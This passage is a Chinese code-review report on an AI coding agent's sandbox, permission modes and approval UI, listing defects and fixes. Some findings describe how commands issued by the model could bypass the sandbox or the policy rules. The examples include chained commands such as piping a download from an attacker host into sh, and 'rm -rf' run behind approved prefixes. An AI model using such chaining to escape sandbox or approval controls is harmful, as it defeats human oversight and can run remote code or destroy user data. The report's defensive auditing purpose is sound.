# Agent 沙箱与权限模式 — 代码审查报告（Review）

- **审查对象**：`feature/sandbox-permissions`（`.worktrees/sandbox-permissions`，分叉基线 `dev` @ `41d5977b` 至提交 `08a8bc6c` 及本次 P0–P3 修复，含 A/B/C 三批功能与补充交付：审批/`/permission` 命令面板、左上角 `lx-<Entry> [<Mode>]` 标记、v32 权限切换持久化与 `<system-update>`、subagent/`/btw` 权限跟随、`lx-18` 提示词及 `lx::agent::approval` 审计日志）
- **实测参考环境**：macOS（本机 arm64，全量 `cargo test` 5854 lib + 全部集成测试全绿）；远程 Linux 主机 `8.138.213.110` 探明为 CentOS Linux 7.9（内核 `3.10.0-1160.119.1.el7.x86_64`、`glibc 2.17`、`user.max_user_namespaces = 0`、setuid `/usr/bin/bwrap 0.3.0`，无 `--perms`），实机跑测已转入 `/Users/yonah/projects/agent/lx-tui/docs/undo/sandbox-permissions.md`。
- **记录口径**：严格收录会导致沙箱绕过、平台执行崩溃、UI/键盘裂脑死锁、状态或数据库不一致、规范越界及文档漂移的真实问题；按 `P0 -> P1 -> P2 -> P3` 排序并已逐项修复锁回归。

---

## 0. 结论速览

| 严重度 | 数量 | 涵盖核心风险 | 状态 |
| --- | ---: | --- | --- |
| P0 | 10 | Linux `bwrap` 能力探测缺失/强传 `--unshare-user` 与 `--perms`、`read-only`/写根外 `deny` 失效、会话前缀未检元字符绕过、`exec_policy` 拼接绕过、Seatbelt 软链路径失效、`Rule` `Always` 无限弹窗死循环、`ask` 与 `approval` 键鼠/UI 裂脑、浮层未抑制且鼠标穿透、`answer` 按单 `call_id` 误删并发审批、`dev` v30 合入丢列风险 | P0-1~P0-9 代码与单测已修复（Linux `bwrap` 实机跑测转 undo）；P0-10 已锁定为合入门控 |
| P1 | 14 | `bwrap` `--chdir` 覆盖 `workdir`、挂载顺序与宿主机残留、`is_banned_prefix` 路径/大小写绕过、`sandbox_gate` 符号链接篡改、`write_stdin` 误触发重试、`lx exec` 与 Windows 提权边界、`Ctrl+C`/粘贴拦截、`/rewind` 未回滚、`fork` 复制未来模式、多窗格同步/入口切换重置、DB `\0` 丢空参数、上下文预算与 `kept.is_empty()`、设置 API 错误码与 `user_root`、窄窗格顶栏撞 `[>_]` | 已修复并锁回归（`bwrap` Linux 实机及 `LatestKind` 独立撤销见 undo） |
| P2 | 10 | `chat/` 内违规 `cfg(target_os)`、rules 追加缺换行破坏语法、`save_sandbox` 校验顺序错、Seatbelt 缺 `deny_globs` 祖先与写根保护、`sweep_orphans` 漏检、审批排队计数与窄栏标签保留、合并切换卡折叠锁死、`SandboxChanged` 未刷新 `/permission` 与设置页缺滚动/`reason`、子会话无效复制切换行、主会话审批 `Blocked` 状态 | 已修复并锁回归 |
| P3 | 4 | 系统提示词超 12 KiB/文案矛盾与截断标签缺失、硬编码文案与死常量/失真测试/字面反引号、超限文件清单登记、设计/任务/结构文档漂移 | 已修复并锁回归（既有超行文件拆解留合入 `dev` 后统筹） |

---

## P0（致命安全绕过 / 平台失效 / 交互死锁 / 数据一致性）

### P0-1：Linux `bwrap` 无条件传 `--unshare-user`、硬编码 `--perms`，`support()` 未做能力探测且误判启动器失败

- **位置**：`src/platform/sandbox/mod.rs:116-141`、`src/platform/sandbox/bwrap.rs:50-52, 138-140`、`src/chat/sandbox/denial.rs:9-46`
- **关键点**：
  1. `support()` 仅检查 `bwrap` 是否存在于 `PATH`，既不探测 `--unshare-user` 也不探测 `--perms`；
  2. `bwrap::build_args()` 无条件追加 `--unshare-user` 且对 `deny` 目录无条件生成 `--perms 000`；
  3. 远程 CentOS 7.9 实测（`max_user_namespaces=0`，setuid `/usr/bin/bwrap 0.3.0`）带 `--unshare-user` 必然报错 `Creating new namespace failed...`，而移除 `--unshare-user` 后无论 `root` 或 `nobody` 均能正常隔离写和网络；且 `bwrap 0.3.0` 不支持 `--perms`。
- **错误原因**：
  未在运行时探测目标主机 `bwrap` 的真实可用模式与参数支持度，导致：
  1. 在禁止非特权 userns 的主机（如非 setuid 的 Ubuntu 24.04 AppArmor）上 `support()` 假报 `Bubblewrap` 可用，且 `denial.rs` 会把 `bwrap: setting up uid map: Permission denied` 误判为沙箱拒绝而弹出“无沙箱重试”审批，破坏 fail-closed；
  2. 在支持 setuid `bwrap` 但禁用了 `userns` 的 CentOS 7 主机上，因无条件传入 `--unshare-user` 令所有受限命令全部无法启动。
- **修复方案**：
  1. 在 `bwrap.rs` 引入 `OnceLock` 缓存能力探测：检查 `bwrap --help` 的 `--perms` 支持度，先试 `bwrap --unshare-user --ro-bind / / -- /bin/true`，失败再回退探测 `bwrap --ro-bind / / --unshare-pid --unshare-ipc -- /bin/true`（setuid/root 兼容）；两者皆败则判定 `Unavailable`；
  2. `support()` 依据真实探测结果返回 `Bubblewrap` 或 `Unavailable`；
  3. `build_args()` 在 setuid 回退模式省略 `--unshare-user`；当遇到需要 `--perms 000` 的 `deny` 目录而宿主机 `bwrap` 不支持 `--perms` 时 fail-closed 返回 `SandboxError::Unavailable`；
  4. `denial.rs` 显式排除 `bwrap:`、`Creating new namespace failed`、`setting up uid map` 等沙箱启动器自身错误输出，避免误触发无沙箱重试。
- **回归测试**：`platform::sandbox::bwrap::tests`（mock 探测能力覆盖 userns / setuid 回退 / 不可用 / 无 `--perms` 拒目录 `deny`）与 `chat::sandbox::denial::tests`（`bwrap` 启动报错不判拒绝）。
- **状态**：代码与 Linux 单测已补齐（`denial.rs` 已在 macOS 验证通过；`bwrap.rs` Linux 目标实机编译跑测已按决策转入 `/Users/yonah/projects/agent/lx-tui/docs/undo/sandbox-permissions.md`）

### P0-2：`bwrap.rs` 完全忽略 `read-only` 模式与写根之外的 `deny` 路径/glob

- **位置**：`src/platform/sandbox/bwrap.rs:119-127`
- **关键点**：`append_deny` 首行若 `!writable_roots.iter().any(|root| path.starts_with(root))` 直接 `return Ok(())`。
- **错误原因**：`--ro-bind / /` 只禁止写而**允许全盘读**，`Deny` 的核心语义是读写双拒；跳过写根外路径导致 `read-only` 模式（写根为空）下所有 `deny` 完全失效，`workspace-write` 下工作区之外的 `deny`（如 `~/.ssh`、跨目录 `/**/.env`）也可被自由读取。
- **修复方案**：对写根外**已存在**（`symlink_metadata(path).is_ok()`）的 `deny` 目标同样生成遮盖挂载（目录 `--perms 000 --tmpfs` / 文件 `--ro-bind /dev/null`）；仅对写根外**不存在**的 `deny` 路径跳过（因 `--ro-bind / /` 已阻止新建）。
- **回归测试**：`platform::sandbox::bwrap::tests` 补充 `read-only` 下文件/目录/glob `deny` 及 `workspace-write` 写根外 `deny` 挂载测试。
- **状态**：代码与 Linux 单测已补齐（Linux 目标实机编译跑测已转入 `/Users/yonah/projects/agent/lx-tui/docs/undo/sandbox-permissions.md`）

### P0-3：`SandboxPlan::command_is_approved` 前缀匹配不校验 shell 元字符，复合命令可裸跑绕过沙箱

- **位置**：`src/chat/sandbox.rs:225-239`、`src/chat/agent_loop/sandbox_decision.rs:78-86`、`src/chat/agent_loop/executor.rs:381-387`
- **关键点**：`approved_prefix` 对 `shlex::split(command)` 直接做 `tokens.starts_with(rule)`。
- **错误原因**：一旦用户批准过一次 `prefix_rule: ["cargo", "publish"]` 并记住到会话，后续模型发送 `"cargo publish && curl https://attacker | sh"` 或 `"cargo publish; rm -rf ~"` 仍以 `["cargo", "publish"]` 开头；第 1-2 步因元字符未命中 `exec_policy Allow`，但第 3 步 `command_is_approved` 返回 `true`，随后 `executor.rs:382` 将整条复合命令设为 `SandboxOverride::Unsandboxed` 无沙箱执行。
- **修复方案**：`SandboxPlan::command_is_approved` 在检查 `approved_prefix` 前强制校验 `crate::chat::exec_policy::split_shell_segments(command).is_some()`，含任意 shell 元字符时禁止前缀匹配放行（`approved_exact` 仍对整条完全相同的历史重试命令有效）。
- **回归测试**：`chat::sandbox::tests` 验证含 `&&`、`;`、`$(...)`、`>` 的复合命令即使前缀命中 `approved_prefix` 也返回 `false`。
- **状态**：已修复并锁回归

### P0-4：`exec_policy::decide` 对含元字符命令仅匹配首 token，`Forbidden` / `Prompt` 规则可被拼接或紧贴操作符绕过

- **位置**：`src/chat/exec_policy/mod.rs:71-82`、`src/chat/exec_policy/policy.rs:74-76`
- **关键点**：`split_shell_segments` 返回 `None` 时，`decide` 仅对 `shlex::split(command)` 整体取 `tokens[0]` 评估。
- **错误原因**：若策略配置了 `prefix_rule(["rm"], decision="forbidden")`，模型执行 `"true && rm -rf /"`（首 token 为 `"true"`）或 `"rm;true"` / `"rm>/dev/null"` / `"(rm -rf /)"`（`shlex` 未按操作符切分，`tokens[0]` 含操作符），均返回 `RuleDecision::None`，彻底绕过 `Forbidden` 与 `Prompt`。
- **修复方案**：当命令含元字符时，按引号外的 shell 控制符（`&&`、`||`、`;`、`|`、`&`、`\n`、`(`、`)`、`{`、`}`、`<`、`>`、`` ` ``、`$(`）切分子片段分别分词并调用 `policy.evaluate`，取全段最严格结果（并保证存在元字符时永不返回 `RuleDecision::Allow`）。
- **回归测试**：`chat::exec_policy::tests` 覆盖 `"true && rm -rf /"`、`"echo ok; rm -rf /"`、`"rm;true"`、`"rm>/dev/null"`、`"(rm -rf /)"` 均命中 `Forbidden`。
- **状态**：已修复并锁回归

### P0-5：macOS Seatbelt 与 `FileSystemPolicy` 对带符号链接祖先（如 `/tmp` → `/private/tmp`）的 `read` carveout 与 `deny` 失效

- **位置**：`src/chat/sandbox/permissions.rs:259-272, 344-364, 411-439`、`src/platform/sandbox/seatbelt.rs:24-48, 55-63, 82-112`
- **关键点**：`roots::writable_roots` 对基准根执行规范化（如 `/tmp` → `/private/tmp`），而 `additional_permissions` 经 `parse_entry` 保留原始字面路径。
- **错误原因**：
  1. `cwd = /tmp/ws` 时，规范化写根为 `/private/tmp/ws`；若请求 `read = ["/tmp/ws/sealed"]`，`path.starts_with(root)` 为假导致 carveout 被直接丢弃；
  2. macOS Seatbelt 内核规则在物理规范路径上匹配，未规范化写入的 `deny_paths`（`/tmp/secret`）与 `deny_globs`（`/tmp/ws/**/*.env`）在 SBPL 中无法拦截实际访问。
- **修复方案**：在 `FileSystemPolicy` 投影写根/carveout 与 `seatbelt` 生成阶段同步解析并同时保留逻辑路径与规范化路径（含 `deny_globs` 静态前缀的规范化别名副本）。
- **回归测试**：`platform::sandbox::seatbelt::tests`（macOS）与 `chat::sandbox::permissions::tests` 以未手动规范化的 `/tmp/<dir>` 验证 `read` carveout、`deny` 路径与 `deny` glob 均实际生效。
- **状态**：已修复并锁回归

### P0-6：`Rule` 审批选 `Always allow prefix` 后仍被原 `prompt` 规则压过，形成无限审批死循环

- **位置**：`src/event/chat/approval.rs:251-260`、`src/chat/exec_policy/policy.rs:74-99`、`src/chat/agent_loop/sandbox_decision.rs:46-75, 166-206`
- **关键点**：`Policy::evaluate` 按 `Allow < Prompt < PromptUser < Forbidden` 取最严决策；`Rule` 审批选择 `ForSession` 时只向 `default.rules` 追加 `decision = "allow"`。
- **错误原因**：用户其他 `.rules` 文件中的 `prompt` 规则永远比 `default.rules` 追加的 `allow` 更严格，且 `approval::answer` 的 `Rule` 分支没有把该前缀写入会话级 `sandbox_prefix_rules` / DB。结果每次运行匹配命令都会在 step 1–2 继续返回 `RuleDecision::Prompt` 并在 step 5 重弹审批。
- **修复方案**：
  1. `approval::answer` 处理 `SandboxApprovalKind::Rule` + `ForSession` 时，除写 `default.rules` 外，同步将前缀记入 `pane.lx.sandbox_prefix_rules` 与 DB `agent_session_sandbox_rule`（`kind = 'prefix'`）；
  2. `sandbox_decision.rs` 在 step 1（`Forbidden` 检查后）、step 3 命中 `plan.command_is_approved(&request.args.cmd)` 时明确返回 `Ok(SandboxOverride::Unsandboxed)` 并跳过 step 5 的 `prompt_evaluation`，确保既不会覆盖 `Forbidden`，又能真正结束本会话同前缀 `Prompt` 重复询问。
- **回归测试**：`chat::agent_loop::tests::sandbox_rules` + `event::chat::tests::approval` 验证存在 `prompt` 规则时，一次 `ForSession` 后后续匹配命令直接执行不再二次弹窗，同时 `forbidden` 规则依然阻断。
- **状态**：已修复并锁回归

### P0-7：`ask` 与 `approvals` 并发挂起时键盘路由与 UI 渲染/鼠标命中分裂（盲操作高危提权）

- **位置**：`src/app/update/pane.rs:121-135`、`src/ui/main_content/lx/approval.rs:18-20, 28, 48, 71`、`src/ui/main_content/lx.rs:350-358`、`src/event/mouse/press/lx.rs:37-82, 147-154`
- **关键点**：键盘优先级为 `task > approval > ask`；但 `approval::visible` 写成 `lx.task.is_none() && lx.ask.is_none() && !lx.approvals.is_empty()`，且 `approval.rs` 依赖 `ask` 激活时置 `None` 的 `input_rect`，`press/lx.rs` 也把 `ask` 命中放在 `approval` 之前。
- **错误原因**：当主会话处于 `ask` 等待且子 agent 申请沙箱审批时，屏幕上显示并可点击的是 `ask`，但键盘按下的 `Enter`/`Tab`/`y`/`a`/`n`/`Esc` 全在盲目裁决不可见的沙箱审批。
- **修复方案**：严格对齐 `design.md` §8.3 的 `task > approval > ask` 统一优先级：
  1. `approval::visible(lx)` 改为 `lx.task.is_none() && !lx.approvals.is_empty()`；
  2. `approval.rs` 布局锚点改为 `super::input_rect(area, lx).or_else(|| super::ask_rect(area, lx))`（或审批优先占位），使审批命令面板稳定显示在 `ask`/输入框上方；
  3. `event/mouse/press/lx.rs` 与 `hover.rs` 将 `approval` 面板矩形命中/拦截置于 `ask` 之前。
- **回归测试**：`ui::main_content::lx::tests::slash_panels` 与 `app::update::chat::tests::approval` 覆盖 `ask` + `approvals` 并存时审批可见且键鼠均一致作用于队首审批。
- **状态**：已修复并锁回归

### P0-8：审批打开期间未抑制 `mention` / `refer` / `paste` / `lx.panel`，且面板非条目区鼠标点击/悬停/滚轮穿透

- **位置**：`src/ui/main_content/lx.rs:400-409`、`src/ui/main_content/lx/{mention,refer,panels}.rs`、`src/event/mouse/{press/lx,hover,wheel}.rs`
- **关键点**：仅有 `slash.rs` 避让了审批面板；其余输入浮层仍照常渲染，且 `press/lx.rs`、`hover.rs`、`wheel.rs` 仅在末尾或局部拦截面板矩形，导致点击审批面板标题/上下文行、悬停面板边框或在面板内滚动滚轮会穿透到下层浮层或聊天历史。
- **错误原因**：审批命令面板作为最高优先输入框浮层接入时，未在所有下层浮层渲染前统一抑制，也未在鼠标点击/悬停/滚轮前段按全矩形先行拦截。
- **修复方案**：
  1. `mention.rs`、`refer.rs`、`panels.rs`（`paste`）及 `lx.rs`（`lx.panel`）统一增加 `!approval::visible(lx)` 守卫；
  2. `press/lx.rs`、`hover.rs`、`wheel.rs` 优先判定可见 `approval::layout` 全矩形（点击非选项区直接吞掉不穿透；悬停吞掉不落入历史折行/按钮；滚轮吞掉不滚动历史）。
- **回归测试**：`ui::main_content::lx::tests::slash_panels` 与 `event::tests` 验证审批打开时下层 `@`/`paste` 隐藏，且上下文行点击、悬停和滚轮均不穿透。
- **状态**：已修复并锁回归

### P0-9：`approval::answer` 仅按 `call_id` 清理 `pane.lx.approvals`，并发同 `call_id` 会误删其他审批导致永久挂起

- **位置**：`src/event/chat/approval.rs:231-235`
- **关键点**：`answer` 使用 `pane.lx.approvals.retain(|approval| approval.call_id != call_id)`（对比 `cancel` 第 316 行正确使用 `&approval.key != key`）。
- **错误原因**：并发子 agent 使用各自 `RequestKey`（不同 `session`）但出现相同 `call_id` 时，回答第一个会连带删掉第二个的 UI 展示项，导致其 `PendingApproval` 永远滞留 `streams.approvals` 无法被裁决。
- **修复方案**：改为精确双键匹配 `pane.lx.approvals.retain(|approval| !(&approval.key == key && approval.call_id == call_id));`。
- **回归测试**：`event::chat::subagent::tests_sandbox` 构造同窗格双子 agent 同 `call_id` 并发审批，验证回答第一条后第二条仍保留且可正常完成裁决。
- **状态**：已修复并锁回归

### P0-10：DB 版本跳过 `dev` 的 `v30` 直接标至 `v32`，合入 `dev` 后停在 `v31/v32` 的库将永久缺失 `agent_compact_checkpoint.kind`（合入门控项）

- **位置**：`src/db/mod.rs:33`、`src/db/migration.rs:285-293, 314-345`（对比 `dev` 的 `migrate_v30_report_checkpoint`）
- **关键点**：`dev` 已用 `v30` 给 `agent_compact_checkpoint` 加 `kind` 列，本分支从 `< 29` 跳到 `< 31`、`v32`，因此本 worktree 隔离库当前 `user_version = 32` 但不含 `kind` 列。
- **错误原因**：未来合并回 `dev` 时，若仅仅把 `if version < 30 { migrate_v30_report_checkpoint()?; }` 放回 `v31` 之前，已升到 `v31/v32` 的开发库会跳过 `version < 30` 检查，导致 `/report`/compact 查询因缺少 `kind` 列直接报错。
- **修复方案**（合入 `dev` 必执行）：
  1. 本分支先修正注释及测试口径（见 P3-2）并确保 `v31`/`v32` 迁移全部幂等；
  2. 合入 `dev` 时保留 `dev` 的 `v30` 与本分支的 `v31`/`v32`，并追加 `v33` 幂等兜底迁移（对已有库检查并补全 `agent_compact_checkpoint.kind` 与沙箱表/列），将 `SCHEMA_VERSION` 推进至 `33`。
- **回归测试**：已在 `review.md` 与 `verification.md` 锁定为合入 `dev` 阻断门控项；合入时在 `db::sandbox::tests` 覆盖“仅缺 `kind` 的 v32 库直升 v33”。
- **状态**：合入门控（已在文档锁定，本分支不跨线引入 `dev` 未合入代码）

---

## P1（高危功能缺陷 / 状态失步 / 边界绕过）

### P1-1：`bwrap.rs` 使用 `--chdir spec.cwd` 覆盖子进程 `workdir`，导致 Linux 上 `exec_command.workdir` 失效

- **位置**：`src/chat/agent_loop/executor.rs:393`、`src/chat/process/manager/mod.rs:185-204`、`src/chat/process/manager/spawn.rs:358-371`、`src/platform/sandbox/bwrap.rs:103-104`
- **关键点**：`executor.rs` 传给 `plan.spec(cwd)` 的是轮次工作区根，`ProcessManager` 虽根据 `args.workdir` 算出子目录并设到 `Command::current_dir`，但 `bwrap` 参数里的 `--chdir` 仍写死为工作区根 `spec.cwd`。
- **错误原因**：`bwrap --chdir` 在容器内覆盖父进程的 `current_dir`，导致 Linux 下 `exec_command(workdir="sub")` 实际在工作区根目录执行，而返回元数据仍谎报 `sub`。
- **修复方案**：在 `ProcessManager` / `spawn.rs` 包装命令前使用真实解析后的 `resolved_cwd` 作为 `SandboxSpec::cwd`（同时保留工作区根等已解析可写根）。
- **回归测试**：`chat::process::manager::tests` 与 `platform::sandbox::bwrap::tests` 验证 `workdir = Some("sub")` 时 `--chdir` 指向 `sub`。
- **状态**：已修复并锁回归

### P1-2：`bwrap.rs` 挂载顺序与边界冲突（嵌套写根被外层 `read` 覆盖、缺失写根崩溃、缺 `read_only` 符号链接检查、嵌套 `deny` 冲突、宿主机 `/tmp/.git` 残留）

- **位置**：`src/platform/sandbox/bwrap.rs:57-99, 136-158`、`src/platform/sandbox/roots.rs:36-54`
- **关键点**：
  1. 先 bind 全部写根再统一挂载全部 `read_only` carveout，导致 `Write("/ws") -> Read("/ws/a") -> Write("/ws/a/b")` 被 `/ws/a` 盖成只读；
  2. 跳过不存在的写根后仍用原始 `roots` 判断前缀，会在只读 `/` 上对着缺失写根建 `/dev/null` 挂载；
  3. `read_only` carveout 未检验 `writable_symlink_component`；
  4. `deny` 同时命中父目录 `/ws/sec` 与子文件 `/ws/sec/.env` 时，先对父目录挂只读 `000` tmpfs 再向内部挂子文件会报错；
  5. 为 `/tmp` 与非 git 工作区自动生成不存在的 `.git` 并用 `--ro-bind /dev/null <path>/.git` 挂载，会在宿主机 `/tmp` 永久留下一枚 0 字节 `.git` 文件（多用户机器若 `/tmp/.git` 属他用户还会导致所有命令启动失败）。
- **错误原因**：未按“浅→深写根分层 + 对应层级 carveout”构造挂载序，未对 `deny` 去除被已挂 `000` tmpfs 目录覆盖的子路径，且对自动保护元数据与不存在的 `/tmp/.git` 缺少防护。
- **修复方案**：
  1. 过滤掉不存在的写根后再参与 `writable` 与前缀判断；
  2. `writable` 与 `read_only` 按深度排序后逐层覆盖（仅挂载“隶属本层写根且不位于任何更深写根之下”的 `read_only`；或深写根之后再处理其更深 carveout），并对 `read_only` 路径同样校验 `writable_symlink_component`；
  3. `deny` 去重时跳过父目录已被 `000` tmpfs 屏蔽的子路径；
  4. 对于系统共享临时根（`/tmp`、`$TMPDIR`）以及非 git 目录中**不存在**的自动 `.git` 保护，Linux 侧避免污染宿主机 `/tmp/.git`（或对工作区自身创建后由 `Wrapped` 追踪在子进程退出时清理仅此次新建的 0 字节占位文件；对 `/tmp` 等公共粘滞目录不向宿主机写入 `.git`）。
- **回归测试**：`platform::sandbox::bwrap::tests` 覆盖嵌套 `Write/Read/Write` 顺序、缺失 `$TMPDIR`/写根、`read_only` 跨符号链接拒批、父目录+子文件同在 `deny`、以及真实 `bwrap` 运行后宿主机 `/tmp/.git` 无残留。
- **状态**：已修复并锁回归

### P1-3：`is_banned_prefix` 仅精确比对裸小写字符串，可被 `/bin/sh`、`./python3`、`Bash`、`osascript` 绕过

- **位置**：`src/chat/tools/process_args.rs:490-539`、`src/chat/exec_policy/mod.rs:300`
- **关键点**：`BANNED_PREFIXES.contains(&token.as_str())` 直接按完整字符串精确匹配。
- **错误原因**：模型提交 `["/bin/sh"]`、`["/usr/bin/env"]`、`["./python3"]` 或大小写变体 `["Bash"]`、`["Git"]` 时全部放行，可绕过危险前缀黑名单并永久写入 `default.rules`；且遗漏 `osascript`/`nodejs`/`pypy` 等脚本执行器。
- **修复方案**：提取 `tokens[0]` 的文件名（`Path::new(token).file_name()`）并转 ASCII 小写再比对扩展后的禁用集合（补齐 `osascript`、`nodejs`、`pypy`、`pypy3`、`pythonw`、`pyw` 等），`git` / `npm` 等多词前缀同样对首 token 做 basename + lowercase 归一。
- **回归测试**：`chat::tools::process_args::tests` 与 `chat::exec_policy::tests` 验证路径前缀、大小写与新增解释器均被拦截。
- **状态**：已修复并锁回归

### P1-4：文件工具闸门 `ensure_writable_resolved` 忽略逻辑路径且 `edit` 允许删除/移动保护目录内符号链接

- **位置**：`src/chat/tools/sandbox_gate.rs:16-44`、`src/chat/tools/write.rs:50-52`、`src/chat/tools/edit.rs:189-192, 452, 617`
- **关键点**：`ensure_writable_resolved(ctx, _logical, resolved)` 丢弃了 `_logical`；`edit` 删除/重命名 `.git/link -> ../ok.txt` 时 `resolve_write_target` 解析到外部可写文件并放行，随后直接删除/移走 `.git/link` 本身。
- **错误原因**：修改或删除目录项操作的是**逻辑路径所在父目录内的条目**，只校验解引用后的最终目标会在保护路径存在符号链接时放行篡改。
- **修复方案**：在 `sandbox_gate` 中同时解析并校验“逻辑路径（规范化父目录 + 末段文件名，不跟随末段符号链接）”与“解析后路径”，两者都必须具备 `Write` 权限。
- **回归测试**：`chat::tools::sandbox_gate::tests` 构造 `.git/link -> ../ok.txt`，验证 `write` 与 `edit`（Update/Delete/Move）均返回 `SandboxDenied` 且零副作用。
- **状态**：已修复并锁回归

### P1-5：`maybe_retry_on_denial` 未限定 `exec_command`，`write_stdin` 退出报错 `"permission denied"` 会误触发重试

- **位置**：`src/chat/agent_loop/sandbox_decision.rs:243-317`
- **关键点**：仅检查 `ToolExecutionResult::Process(process)`，未判断 `call.name == "exec_command"` 及 `process.kind == ProcessResultKind::ExecCommand`。
- **错误原因**：交互进程在 `write_stdin` 阶段退出并输出 `Permission denied` 时，会误弹出重试审批并在批准后用 `write_stdin` 参数重调导致 `process_not_found`。
- **修复方案**：在 `maybe_retry_on_denial` 入口增加 `if call.name != "exec_command" || process.kind != ProcessResultKind::ExecCommand { return result; }`。
- **回归测试**：`chat::agent_loop::tests::sandbox_rules` 验证 `write_stdin` 携带 `"Permission denied"` 时不请求审批。
- **状态**：已修复并锁回归

### P1-6：无头 `lx exec` 未强制 `escalation = never`、子 agent schema 未裁剪且 `resume` 丢失 DB 规则；Windows 下 `require_escalated` 仍弹审批

- **位置**：`src/chat/agent/exec/{mod.rs:183-192, runner.rs:263-268, 488-511, subagent/context.rs:201-209, 257-262, subagent/turn.rs:122-147}`、`src/chat/agent_loop/sandbox_decision.rs:112-163`
- **关键点**：
  1. 无头 `exec` 模式（含子 agent）沿用用户配置的 `escalation`（默认 `ask`）而非按规范强制设为 `Never`；
  2. `exec/subagent/context.rs` 未调用 `trim_escalation_parameters`；
  3. `exec/runner.rs` 与 `exec/subagent/turn.rs` 未加载 `db.sandbox_rules`；
  4. `sandbox_decision.rs` 未对 `SandboxSupport::FileToolsOnly`（Windows）跳过 `require_escalated` 审批。
- **错误原因**：无头与 Windows 特例在 `exec/` 与 `sandbox_decision.rs` 中接入不完整，偏离 `design.md` §7 与 §8.2。
- **修复方案**：
  1. `exec` 装配与 `runner` / `exec/subagent` 强制 `sandbox_settings.escalation = EscalationPolicy::Never`，为 `exec/subagent/context.rs` 补齐 `trim_escalation_parameters`，并在 `runner.rs` / `exec/subagent/turn.rs` 加载 `db.sandbox_rules`；
  2. `sandbox_decision.rs` 在 `plan.support == SandboxSupport::FileToolsOnly` 且 `EscalationKind::Unsandboxed` 时直接返回 `Ok(SandboxOverride::None)`（与 `danger-full-access` 一致，不弹无意义审批）。
- **回归测试**：`chat::agent::exec::tests` 与 `chat::agent_loop::tests::sandbox_rules` 验证无头 `escalation="never"` / schema 裁剪 / `resume` 规则加载与 `FileToolsOnly` 免弹窗。
- **状态**：已修复并锁回归

### P1-7：审批打开期间 `Ctrl+C`（`LxInput::Clear`）无效，且终端粘贴未被拦截会改写底层草稿

- **位置**：`src/app/update/chat/approval.rs:15-52`、`src/event/input.rs:357-396`
- **关键点**：`apply_approval_input` 将 `LxInput::Clear`（无选区 `Ctrl+C`）落入 `_ => false`；`handle_paste_event` 只拦了 `btw`/`task`/`ask`，漏拦 `!pane.lx.approvals.is_empty()`。
- **错误原因**：违背 `design.md` §8.3/§12.4（`Ctrl+C` 拒绝审批并取消对应主轮，审批打开期间隔离草稿输入）。
- **修复方案**：
  1. `apply_approval_input` 增加 `LxInput::Clear`：拒绝并弹出队首审批，若 `front.key` 为当前主轮 `RequestState::Streaming` 则同步调用 `stop_stream`；
  2. `handle_paste_event` 在 `ask.is_some()` 之前检查 `pane.lx.task.is_none() && !pane.lx.approvals.is_empty()` 直接拦截粘贴。
- **回归测试**：`app::update::chat::tests::approval` 验证 `LxInput::Clear` 拒绝审批并停止流；`event::tests` 验证审批期间粘贴不修改 `lx.input`。
- **状态**：已修复并锁回归

### P1-8：`/rewind` 截断或删空会话时未回滚 `sandbox_mode` 与会话规则（`LatestKind` 亦缺单独的 `PermissionSwitch`）

- **位置**：`src/db/chat/rewind.rs:724-785`、`src/event/chat/rewind.rs:392-464`、`src/app/update/chat/rewind.rs:174-236`
- **关键点**：`commit_rewind` 删掉了被撤回的 `agent_permission_switch` 并回滚了模型列，却未回滚 `agent_session.sandbox_mode` 与 `agent_session_sandbox_rule`；`session_deleted` 分支与 `handle_rewind_finished` 亦未将 DB 最新模式/规则同步回窗格；`select_latest` 未纳入仅权限切换状态。
- **错误原因**：回滚与重装逻辑沿用 `model_switch` 路径时遗漏 `sandbox_mode` 与 `sandbox_rules` 字段。
- **修复方案**：
  1. `commit_rewind` 在删除 `agent_permission_switch` 前记录最早被删切换的 `from_mode`（或保留切换末尾的 `to_mode`），回写 `agent_session.sandbox_mode` 并清理被回滚作用域的 `agent_session_sandbox_rule`；
  2. `RewindView` 返回最新 `sandbox_mode` 与 `sandbox_rules`，`handle_rewind_finished` 在 `session_deleted` 清空并在存活分支同步所有绑定该会话的窗格；
  3. `LatestKind` 与 `select_latest` 补齐 `PermissionSwitch` 节点以便仅切权未发消息时可双 `Esc` 撤销（或同步清除切换记录）。
- **回归测试**：`db::sandbox::tests`（`commit_rewind_rolls_back_sandbox_mode_and_clears_session_rules`）与 `event::chat::tests::approval`（`handle_rewind_finished_syncs_and_resets_sandbox_state`）覆盖切权后 `/rewind` 回滚与删空重置；独立 `LatestKind::PermissionSwitch` 单项撤销已按边界策略转入 `docs/undo/sandbox-permissions.md`。
- **状态**：已修复并锁回归（主回滚链路完成，独立 `LatestKind::PermissionSwitch` 转 undo）

### P1-9：`fork_chat_session` 按 `before` 边界分叉时无条件复制边界之后才切换的 `sandbox_mode`

- **位置**：`src/db/chat/fork.rs:115-131, 275, 353-359`
- **关键点**：`copy_permission_switches_for_fork` 裁剪了 `sequence < boundary` 的切换行，但新会话 `sandbox_mode` 仍直接取源会话当前最新值。
- **错误原因**：在权限切换发生之前的历史节点执行 `/fork`，新会话不会带有该切换卡片，但 `sandbox_mode` 却变成了未来切档后的高/低权限模式。
- **修复方案**：在 `copy_fork_rows` 根据 `boundary` 推导边界处生效模式：取 `sequence < boundary` 最后一条的 `to_mode`，若无则取 `sequence >= boundary` 首条的 `from_mode`，都没有切换记录才复制源会话当前 `sandbox_mode`。
- **回归测试**：`db::sandbox::tests` 新增 `before = Some(msg_id)` 分叉测试，验证切档前分叉保留切档前模式。
- **状态**：已修复并锁回归

### P1-10：`PersistSandboxMode` 多窗格同步缺失且吞掉 DB 错误；入口/AI Web 站点切换未重置沙箱态

- **位置**：`src/db/service/chat.rs:876-909`、`src/app/update/chat/permission_switch.rs:68-114`、`src/app/update/pane.rs:743-754, 783-795`
- **关键点**：
  1. `PersistSandboxMode` 未同步同会话兄弟窗格的 `sandbox_mode` 与清空其旧规则，且 `let _ =` 吞掉了数据库错误而不回滚源窗格状态；
  2. `set_lx_entry` 与 `set_ai_web_site` 重置会话视图时漏掉 `sandbox_mode`、规则、`approvals` 与 `permission_switch.reset()`，导致 `AiWeb` 窗格残留 `has_history == true` 或污染切回后的 `Native` 会话。
- **错误原因**：多窗格共享会话与入口切换清理漏接新增字段；持久化错误未显式传播/回滚。
- **修复方案**：
  1. `PersistSandboxMode` 写库失败时记录错误、回滚源窗格为持久化前的有效状态并弹窗格内警告 toast；成功时同步所有绑定同 `session_id` 窗格的 `sandbox_mode` 并清空其旧规则；
